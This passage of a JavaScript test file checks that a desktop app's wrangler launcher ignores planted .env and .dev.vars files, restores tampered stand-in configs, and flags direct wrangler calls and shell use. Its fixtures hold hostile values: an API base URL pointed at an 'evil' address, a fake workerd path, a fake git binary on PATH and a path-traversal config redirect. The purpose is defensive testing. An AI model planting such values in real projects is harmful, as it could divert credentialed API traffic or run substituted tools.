  assert.equal(plain.name, 'talkweaver-live-sessions')
  assert.ok(!('routes' in plain) && !('workers_dev' in plain), 'no share domain: the shipped settings, unchanged otherwise')
  assert.deepEqual(plain.migrations, JSON.parse(JSON.stringify(plain.migrations)))
  const shared = liveWorkerDeployConfig('{ // comment\n "main": "index.ts", /* block */ "name": "w" }', 'C:\\Program Files\\TalkWeaver\\resources\\worker', 'drafts.example.org', 'win32')
  assert.deepEqual(shared, { main: 'C:\\Program Files\\TalkWeaver\\resources\\worker\\index.ts', name: 'w', workers_dev: true, routes: [{ pattern: 'drafts.example.org', custom_domain: true }] })
  const main = readSource(join(repo, 'src/main/index.ts'))
  assert.ok(!/path:\s*baseConfig\b/.test(main), 'the main process never hands wrangler the config inside the app folder for a deploy')
}

// ── 4. Real runs from this checkout, with nothing useful on PATH ────────────────────────────────
{
  const scratch = mkdtempSync(join(tmpdir(), 'tw-wrangler-launcher-'))
  try {
    const pinned = JSON.parse(readFileSync(join(repo, 'package.json'), 'utf8')).dependencies.wrangler
    assert.match(pinned, /^\d+\.\d+\.\d+$/, 'wrangler is an exact-version dependency of the app (it ships in the installer)')
    // As in the app: a user-data folder, and inside it the folder kept for wrangler runs.
    const userData = join(scratch, 'user-data')
    const install = { execPath: process.execPath, appRoot: repo, platform: process.platform, workDir: join(userData, 'wrangler-runs') }
    // The inherited side is this process's real environment (the launcher reduces it).
    // (wrangler's home, settings and cache are inside the run folder by the launcher's own doing.)
    const set = { WRANGLER_LOG_PATH: join(scratch, 'logs') }
    const run = await runWrangler(install, ['--version'], { timeoutMs: 60_000, inherited: process.env, set })
    assert.equal(run.ok, true, `wrangler --version ran through the launcher\n${run.stdout}\n${run.stderr}`)
    assert.equal(run.stdout.trim(), pinned, 'and it is the app\'s pinned wrangler')
    assert.equal(readFileSync(wranglerEnvFilePath(install), 'utf8'), '', 'the run made its folder and the empty env file')

    // No dotenv file TalkWeaver did not write is loaded. REAL runs (a dry-run deploy of the repository's
    // Worker: local, no token, nothing uploaded), not a fake child. wrangler loads a dotenv file whole
    // into its process.env, so one canary line tells whether the file was read: WRANGLER_OUTPUT_FILE_PATH
    // makes wrangler write a report file there (read when the command starts; a dry run touches neither
    // the API nor workerd, so the two names the review gave cannot show by themselves). They are in the
    // same file: if the canary is not loaded, neither are they.
    const canary = join(scratch, 'canary-output.ndjson')
    const hostile = [
      'CLOUDFLARE_API_BASE_URL=http://127.0.0.1:9/evil', 'MINIFLARE_WORKERD_PATH=/nonexistent/evil-workerd',
      `WRANGLER_OUTPUT_FILE_PATH=${canary.replaceAll('\\', '/')}`, '',
    ].join('\n')
    const config = join(install.workDir, 'live-worker-wrangler.generated.jsonc')
    writeFileSync(config, JSON.stringify(liveWorkerDeployConfig(readFileSync(join(repo, 'worker/wrangler.jsonc'), 'utf8'), join(repo, 'worker'), null)))

    // (a) Before each run the folder is cleared of `.env*` and `.dev.vars*`; nothing else is touched.
    const swept = ['.env', '.env.local', '.env.production', '.dev.vars', '.dev.vars.production']
    for (const name of swept) writeFileSync(join(install.workDir, name), hostile)
    mkdirSync(join(install.workDir, '.wrangler', 'tmp'), { recursive: true })
    writeFileSync(wranglerEnvFilePath(install), hostile)
    prepareWranglerWorkDir(install)
    for (const name of swept) assert.equal(existsSync(join(install.workDir, name)), false, `${name} is removed before a run`)
    assert.ok(existsSync(config) && existsSync(join(install.workDir, '.wrangler', 'tmp')), 'the generated config and wrangler\'s own scratch stay')
    assert.equal(readFileSync(wranglerEnvFilePath(install), 'utf8'), '', 'the env file wrangler is pointed at is rewritten empty')
    // And what else the app keeps there so that wrangler looks no further (wranglerRunFolder).
    const folder = wranglerRunFolder(install)
    writeFileSync(join(folder.emptyPath, 'git'), '#!/bin/sh\n')
    writeFileSync(folder.pagesConfigStub, '{ "name": "evil", "pages_build_output_dir": "/evil" }')
    prepareWranglerWorkDir(install)
    assert.deepEqual(readdirSync(folder.emptyPath), [], 'the PATH folder is emptied before every run')
    assert.deepEqual(JSON.parse(readFileSync(folder.pagesConfigStub, 'utf8')), {}, 'the stand-in config is rewritten: not a Pages config, so Pages ignores it')
    assert.deepEqual(JSON.parse(readFileSync(folder.pagesRedirect, 'utf8')), { configPath: '../../wrangler.json' })
    assert.deepEqual(JSON.parse(readFileSync(folder.packageJson, 'utf8')), { private: true })
    assert.ok(existsSync(folder.home) && existsSync(folder.cache))

    // The app's own files there are written ONCE: a later run that finds the right bytes leaves them
    // untouched (another wrangler may be reading them), and a wrong one is replaced by a rename, never
    // by emptying the file in place.
    const standIns = [folder.envFile, folder.pagesConfigStub, folder.pagesRedirect, folder.packageJson, folder.tsconfig]
    assert.equal(readFileSync(folder.tsconfig, 'utf8'), '{}\n', 'an empty tsconfig.json of the app\'s own, so none above the run folder is the nearest')
    const identity = () => standIns.map((path) => { const stat = statSync(path, { bigint: true }); return `${stat.ino}:${stat.mtimeNs}` })
    const before = identity()
    writeFileSync(join(install.workDir, '.env'), hostile)
    for (let i = 0; i < 3; i++) prepareWranglerWorkDir(install)
    assert.deepEqual(identity(), before, 'preparing again does not rewrite a stand-in that is already right')
    assert.equal(existsSync(join(install.workDir, '.env')), false, 'while a stray .env is still cleared')
    assert.equal(existsSync(folder.envFile), true, 'and clearing `.env*` never touches the app\'s own env file')
    writeFileSync(folder.pagesRedirect, '{ "configPath": "../../../evil.json" }')
    prepareWranglerWorkDir(install)
    assert.deepEqual(JSON.parse(readFileSync(folder.pagesRedirect, 'utf8')), { configPath: '../../wrangler.json' }, 'a stand-in with other bytes is put right')
    const after = identity()
    assert.notEqual(after[2], before[2], 'by a new file renamed into place')
    assert.deepEqual([after[0], after[1], after[3], after[4]], [before[0], before[1], before[3], before[4]], 'and only that one')
    const leftovers = [install.workDir, dirname(folder.pagesRedirect)].flatMap((dir) => readdirSync(dir)).filter((name) => name.endsWith('.tmp'))
    assert.deepEqual(leftovers, [], 'no temporary file is left behind')

    // (b) Files that appear after the clearing (and one in user data itself) still change nothing:
    // wrangler is told to read the empty file and no other.
    const plant = () => {
      for (const dir of [install.workDir, userData]) for (const name of ['.env', '.env.local', '.dev.vars']) writeFileSync(join(dir, name), hostile)
    }
    const dryRun = (outdir, alter = (args) => args) => {
      const resolved = resolveWranglerLaunch(install, ['deploy', '--dry-run', '--outdir', outdir, '--config', config], { inherited: process.env, set })
      plant()
      return spawnSync(resolved.launch.command, alter(resolved.launch.args), { cwd: resolved.launch.cwd, env: resolved.launch.env, encoding: 'utf8', timeout: 120_000, windowsHide: true })
    }
    const guarded = dryRun(join(scratch, 'out-guarded'))
    assert.equal(guarded.status, 0, `a planted .env has no effect on a deploy\n${guarded.stdout}\n${guarded.stderr}`)
    assert.ok(readdirSync(join(scratch, 'out-guarded')).some((name) => name.endsWith('.js')), 'the Worker compiled with the app\'s own esbuild')
    assert.equal(existsSync(canary), false, 'and nothing in the planted .env, .env.local or .dev.vars reached wrangler')
    // (c) The control: the very same run WITHOUT the `--env-file` switch reads the planted `.env` (the
    // canary file appears), so (b) passing is the switch's doing and this test can fail.
    const withoutSwitch = (args) => { const at = args.indexOf('--env-file'); return [...args.slice(0, at), ...args.slice(at + 2)] }
    const unguarded = dryRun(join(scratch, 'out-unguarded'), withoutSwitch)
    assert.equal(existsSync(canary), true, `control: without --env-file wrangler does load the planted .env\n${unguarded.stdout}\n${unguarded.stderr}`)

    // The switch is accepted by the commands that cannot run here (they need the Cloudflare API):
    // with no token, wrangler stops at "set a CLOUDFLARE_API_TOKEN" before any request, and never at
    // "Unknown argument".
    for (const command of [['pages', 'deploy', join(scratch, 'out-guarded'), '--project-name', 'p', '--branch', 'main', '--commit-dirty=true'], ['secret', 'bulk', '--config', config]]) {
      const refused = await runWrangler(install, command, { timeoutMs: 60_000, inherited: process.env, set, input: '{}' })
      const said = `${refused.stdout}\n${refused.stderr}`
      assert.equal(refused.ok, false)
      assert.ok(!/Unknown argument/i.test(said), `${command.slice(0, 2).join(' ')} accepts --env-file\n${said}`)
      assert.match(said, /CLOUDFLARE_API_TOKEN/, `${command.slice(0, 2).join(' ')} stopped for want of a token\n${said}`)
    }
    assert.equal(prepareWranglerRun(install, ['--version']).ok, true)
  } finally {
    rmSync(scratch, { recursive: true, force: true, maxRetries: 3 })
  }
}

// ── 5. Tripwire for accidental direct wrangler calls; no shell in the main process ──────────────
// A REGRESSION TRIPWIRE, NOT A SECURITY BOUNDARY: it exists so that someone who types
// spawn('wrangler', …) or ['npx', 'wrangler'] in the main process out of habit is told to use the
// launcher. For the main process it flags any string that IS wrangler (as a command, or as an
// argument to npx/bunx/node), wherever it sits: a call, a variable, an array.
// It does NOT catch, and is not meant to:
//   - a name built by concatenation ('wran' + 'gler', ['w', 'rangler'].join(''));
//   - wrangler inside a compound shell string ('cd worker && wrangler deploy', 'sh -c "… wrangler …"').
// The second shape needs a shell, and the check after it (no shell in the main process) is the one
// that carries weight.
const parse = (fileName, text) => ts.createSourceFile(fileName, text, ts.ScriptTarget.Latest, true, fileName.endsWith('x') ? ts.ScriptKind.TSX : ts.ScriptKind.TS)
const NAMES_WRANGLER = /^(?:(?:npx|bunx|pnpm|yarn|node|npm exec|pnpm exec|pnpm dlx)\s+(?:-\S+\s+)*)?(?:[^\s'"]*[\\/])?wrangler(?:\.cmd|\.exe|\.js|\.ps1)?(?:@\S+)?(?:\s|$)/i
function directWranglerCallsIn(fileName, text) {
  const source = parse(fileName, text)
  const found = []
  const visit = (node) => {
    const literal = ts.isStringLiteral(node) || ts.isNoSubstitutionTemplateLiteral(node) ? node.text
      : ts.isTemplateExpression(node) ? node.head.text : null
    if (literal !== null && NAMES_WRANGLER.test(literal) && !ts.isImportDeclaration(node.parent)) {
      found.push(`${fileName}:${source.getLineAndCharacterOfPosition(node.getStart()).line + 1}`)
    }
    ts.forEachChild(node, visit)
  }
  visit(source)
  return found
}
{
  // What the tripwire is for: the two shapes a search for literal calls misses, and their relatives.
  const caught = [
    "const tool = 'wrangler'; spawn(tool, args)",
    "execFile('npx', ['wrangler', 'deploy'])",
    'spawn("wrangler.cmd", ["dev"], { shell: true })',
    'exec(`wrangler pages deploy ${dir}`)',
    "execSync('npx wrangler@4 deploy')",
    "const bin = join(root, 'node_modules', '.bin', 'wrangler')",
    "spawn(process.execPath, ['./node_modules/wrangler/bin/wrangler.js'])",
    "execFile('bunx', ['--bun', 'wrangler'])",
  ]
  for (const sample of caught) assert.equal(directWranglerCallsIn('sample.ts', sample).length > 0, true, `caught: ${sample}`)
  const allowed = [
    "const config = join(liveWorkerDir(), 'wrangler.jsonc')",
    "const log = join(userData, 'live-worker-wrangler.log')",
    "return { ok: false, error: `Cloudflare deploy failed: ${text}` }",
    "import { runWrangler } from './wrangler-launcher'",
    "runBundledWrangler(['pages', 'deploy', siteDir], { set })",
    "const help = 'publishing cloudflare pages api token wrangler sharing'",
  ]
  for (const sample of allowed) assert.deepEqual(directWranglerCallsIn('sample.ts', sample), [], `allowed: ${sample}`)

  const filesBelow = (dir) => readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const path = join(dir, entry.name)
    return entry.isDirectory() ? filesBelow(path) : /\.(?:mjs|js|ts|tsx)$/.test(entry.name) ? [path] : []
  })
  const named = filesBelow(join(repo, 'src/main'))
    .filter((file) => relative(repo, file).split('\\').join('/') !== 'src/main/wrangler-launcher.ts')
    .flatMap((file) => directWranglerCallsIn(relative(repo, file), readSource(file)))
  assert.deepEqual(named, [], 'tripwire: under src/main only wrangler-launcher.ts names wrangler as a command or an argument')
  // The two shapes it is documented not to catch, kept here so the comment above stays true.
  for (const missed of ["spawn('wran' + 'gler', args)", "execFile('sh', ['-c', 'cd worker && wrangler deploy'])"]) {
    assert.deepEqual(directWranglerCallsIn('sample.ts', missed), [], `known gap: ${missed}`)
  }

  // No shell in the main process: nothing under src/main may run a command line through a shell
  // (child_process exec / execSync, or `shell: true` on spawn / execFile), which is how a compound
  // string could reach wrangler, or anything else, by PATH. Exceptions that exist today: NONE
  // (2026-10-07: src/main uses only execFile, execFileSync and spawn with argument arrays). Add a
  // file here, with the reason, only together with a review of that call.
  const SHELL_EXCEPTIONS = new Map([])
  const shellUsesIn = (fileName, text) => {
    const source = parse(fileName, text)
    const found = []
    const at = (node, what) => found.push(`${fileName}:${source.getLineAndCharacterOfPosition(node.getStart()).line + 1} ${what}`)
    const isChildProcess = (node) => ts.isStringLiteral(node) && /^(?:node:)?child_process$/.test(node.text)
    const visit = (node) => {
      if (ts.isImportDeclaration(node) && isChildProcess(node.moduleSpecifier)) {
        const bindings = node.importClause?.namedBindings
        if (node.importClause?.name || (bindings && ts.isNamespaceImport(bindings))) at(node, 'imports all of child_process (exec cannot be ruled out)')
        if (bindings && ts.isNamedImports(bindings)) {
          for (const element of bindings.elements) if (/^exec(?:Sync)?$/.test((element.propertyName ?? element.name).text)) at(element, `imports ${(element.propertyName ?? element.name).text}`)
        }
      }
      if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === 'require' && node.arguments[0] && isChildProcess(node.arguments[0])) at(node, 'requires child_process')
      // `shell` in the options of a process-starting call (not Electron's `shell` module passed elsewhere).
      const startsProcess = (property) => {
        const call = property.parent?.parent
        if (!call || !ts.isCallExpression(call)) return false
        const callee = ts.isPropertyAccessExpression(call.expression) ? call.expression.name.text : ts.isIdentifier(call.expression) ? call.expression.text : ''
        return /^(?:spawn|spawnSync|execFile|execFileSync|exec|execSync|fork)$/.test(callee)
      }
      if (ts.isPropertyAssignment(node) && (ts.isIdentifier(node.name) || ts.isStringLiteral(node.name)) && node.name.text === 'shell' && node.initializer.kind !== ts.SyntaxKind.FalseKeyword && startsProcess(node)) at(node, 'sets shell on a child process')
      if (ts.isShorthandPropertyAssignment(node) && node.name.text === 'shell' && startsProcess(node)) at(node, 'sets shell on a child process')
      ts.forEachChild(node, visit)
    }
    visit(source)
    return found
  }
  for (const sample of [
    "import { exec } from 'child_process'", "import { execSync as run } from 'node:child_process'", "import * as cp from 'node:child_process'",
    "import cp from 'child_process'", "const { exec } = require('child_process')", "spawn('npm', ['run', 'x'], { shell: true })", "execFile(tool, args, { shell })",
    "spawn(tool, args, { shell: process.platform === 'win32' })",
  ]) assert.equal(shellUsesIn('sample.ts', sample).length > 0, true, `shell use caught: ${sample}`)
  for (const sample of [
    "import { execFile, execFileSync, spawn, type ChildProcessByStdio } from 'child_process'", "const m = /x/.exec(text)", "while ((m = re.exec(html))) {}",
    "spawn(tool, args, { shell: false, windowsHide: true })",
    "registerImporterIpc({ ipcMain, dialog, shell, platform })",
  ]) assert.deepEqual(shellUsesIn('sample.ts', sample), [], `not a shell use: ${sample}`)
  const shellUses = filesBelow(join(repo, 'src/main'))
    .map((file) => [relative(repo, file).split('\\').join('/'), file])
    .filter(([name]) => !SHELL_EXCEPTIONS.has(name))
    .flatMap(([name, file]) => shellUsesIn(name, readSource(file)))
  assert.deepEqual(shellUses, [], 'nothing under src/main runs a command through a shell')

  // Elsewhere (renderer, scripts, e2e) this is a search for LITERAL calls and for the retired
  // helpers and messages only; a script that wanted to could still build the name indirectly.
  const banned = [
    [/\b(?:spawn|spawnSync|execFile|execFileSync|exec|execSync)\(\s*['"`](?:npx |bunx )?wrangler\b/, 'starts a bare wrangler with a literal call'],
    [new RegExp(['wrangler', 'FoundOn'].join('')), 'searches PATH for wrangler'],
    [new RegExp(['augmented', 'Path'].join('')), 'builds a search PATH'],
    [new RegExp(['wrangler not', ' found'].join('')), 'tells the person to install wrangler'],
    [new RegExp(['npm(?:\\s|&nbsp;)+i(?:nstall)?(?:\\s|&nbsp;)+-g(?:\\s|&nbsp;)+', 'wrangler'].join('')), 'tells the person to install wrangler'],
  ]
  const self = fileURLToPath(import.meta.url)
  const found = []
  for (const dir of ['src', 'scripts', 'e2e']) {
    for (const file of filesBelow(join(repo, dir))) {
      if (file === self) continue
      const text = readSource(file)
      for (const [pattern, why] of banned) if (pattern.test(text)) found.push(`${relative(repo, file)}: ${why}`)
    }
  }
  assert.deepEqual(found, [], 'no literal bare-wrangler call, retired helper or install-wrangler message anywhere')
  const main = readSource(join(repo, 'src/main/index.ts'))
  for (const command of ["'dev', '--config'"]) {
    assert.ok(main.includes(command), `the ${command} call site is still in the main process (update this list if it moved)`)
  }
  // `pages deploy` moved into the one publishing sequence (ticket 04), which the main process calls
  // with `runBundledWrangler` as its upload port (scripts/test-handout-publishing.mjs drives it).
  assert.ok(readSource(join(repo, 'src/main/handout-publishing.ts')).includes("'pages', 'deploy'"), "the 'pages', 'deploy' call site is in the publishing sequence (update this list if it moved)")
  assert.ok(/upload: \(args, credentials\) => runBundledWrangler\(args, \{ set: credentials \}\)/.test(main), 'and its upload goes through the bundled launcher')
  // The live service is set up and updated without wrangler (ticket 11): its sequence is Cloudflare
  // API requests (scripts/test-live-service-upload.mjs drives it), and nothing in it or in the main
  // process's set-up launches a tool. `wrangler dev` stays, for tests and the unpackaged app.
  const sequence = readSource(join(repo, 'src/main/live-service-deploy.ts'))
  for (const command of ["'deploy'", "'secret'", "'bulk'", 'launch(', 'runBundledWrangler']) {
    assert.ok(!sequence.replace(/^\s*\/\/[^\n]*$/gm, '').includes(command), `the live service's set-up sequence has no ${command}`)
  }
  const setUp = main.slice(main.indexOf('function deployLiveWorker('), main.indexOf('async function startLocalLiveWorker('))
  assert.ok(setUp.includes('return deployLiveService({') && !/runBundledWrangler|prepareWranglerRun|wranglerMissing/.test(setUp), 'and the main process gives it no launcher')
}

console.log('wrangler launcher: macOS, Windows and unpackaged path shapes; missing-tool message; environment built from an allowlist (inherited selectors dropped, Node-start names refused, Windows root checked); no dotenv file read (real dry-run deploy with a planted .env, and its control); output bounded; --version through the launcher; direct-call tripwire and no-shell check for src/main — passed')
